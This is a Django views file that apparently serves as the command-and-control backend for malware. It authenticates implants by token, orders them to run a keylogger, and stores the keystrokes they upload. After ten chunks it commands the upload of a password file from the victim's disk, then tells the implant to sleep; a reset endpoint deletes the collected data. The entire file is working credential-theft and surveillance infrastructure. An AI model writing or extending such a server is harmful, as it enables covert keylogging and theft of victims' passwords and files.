from django.http import JsonResponse
from .models import Malware, Command, DataItem, File
from django.views.decorators.csrf import csrf_exempt

KEY_LOGGER_COMMAND = 'keylogger'
SUBMIT_FILE_COMMAND = 'submit_file'
SLEEP_COMMAND = 'sleep'

FILE_PATH = r'C:\my_password.txt'
TIME_TO_SLEEP = 10


@csrf_exempt
def cnc(request):
    if request.method == 'POST':
        if 'token' in request.POST and 'command' in request.POST and 'parameter' in request.POST or 'parameter' in request.FILES:
            malware = get_malware_by_token(request.POST['token'])
            if malware:
                if request.POST['command'] == 'connect':
                    Command(
                        type=KEY_LOGGER_COMMAND,
                        value='',
                        malware=malware,
                    ).save()
                    json_response = {
                        "success": True,
                        "message": 'Connection successfully established',
                        "command": KEY_LOGGER_COMMAND,
                        "argument": None,
                    }
                elif request.POST['command'] == KEY_LOGGER_COMMAND:
                    try:
                        data_item = DataItem.objects.get(malware=malware, name=KEY_LOGGER_COMMAND)
                        data_item.data += request.POST['parameter'] + '\r\n'
                        data_item.data_chunks_sent += 1
                        data_item.save()
                        json_response = {
                            "success": True,
                            "message": 'Keylog appended successfully',
                            "command": KEY_LOGGER_COMMAND,
                            "argument": None,
                        }
                        if data_item.data_chunks_sent >= 10:
                            json_response['command'] = SUBMIT_FILE_COMMAND
                            json_response['argument'] = FILE_PATH

                            Command(
                                type=SUBMIT_FILE_COMMAND,
                                value=FILE_PATH,
                                malware=malware
                            ).save()
                    except DataItem.DoesNotExist:
                        DataItem(
                            name=KEY_LOGGER_COMMAND,
                            data=request.POST['parameter'] + '\r\n',
                            malware=malware,
                        ).save()

                        json_response = {
                            "success": True,
                            "message": 'Keylog stored successfully',
                            "command": KEY_LOGGER_COMMAND,
                            "argument": None,
                        }
                elif request.POST['command'] == SUBMIT_FILE_COMMAND:
                    if 'parameter' in request.FILES:
                        File(
                            name=FILE_PATH,
                            data=request.FILES['parameter'],
                            malware=malware,
                        ).save()

                        Command(
                            type=SLEEP_COMMAND,
                            value=TIME_TO_SLEEP,
                            malware=malware
                        ).save()

                        json_response = {
                            "success": True,
                            "message": 'File stored successfully',
                            "command": SLEEP_COMMAND,
                            "argument": TIME_TO_SLEEP,
                        }
                    else:
                        json_response = send_failure_message('Attached file not recognized')
                elif request.POST['command'] == SLEEP_COMMAND:
                    json_response = {
                        "success": True,
                        "message": 'Good morning!',
                        "command": SLEEP_COMMAND,
                        "argument": TIME_TO_SLEEP,
                    }
                else:
                    json_response = send_failure_message('Command not recognized')
            else:
                json_response = send_failure_message('Malware not authorized')
        else:
            json_response = send_failure_message('Request missing parameters')
    else:
        json_response = send_failure_message('POST method is required')

    return JsonResponse(json_response)


def reset(request):
    if request.method == 'GET' and 'token' in request.GET:
        malware = get_malware_by_token(request.GET['token'])
        if malware:
            Command.objects.filter(malware=malware).delete()
            DataItem.objects.filter(malware=malware).delete()
            File.objects.filter(malware=malware).delete()
            json_response = {
                "success": True,
                "message": 'Data deleted successfully',
            }
        else:
            json_response = send_failure_message('Malware not authorized')
    else:
        json_response = send_failure_message('Use GET method and specify a token')

    return JsonResponse(json_response)


def handle_uploaded_file(f):
    with open('some/file/name.txt', 'wb+') as destination:
        for chunk in f.chunks():
            destination.write(chunk)


def get_malware_by_token(token):
    try:
        return Malware.objects.get(token=token)
    except Malware.DoesNotExist:
        return None


def send_failure_message(message):
    return {
        "message": message,
        "success": False,
    }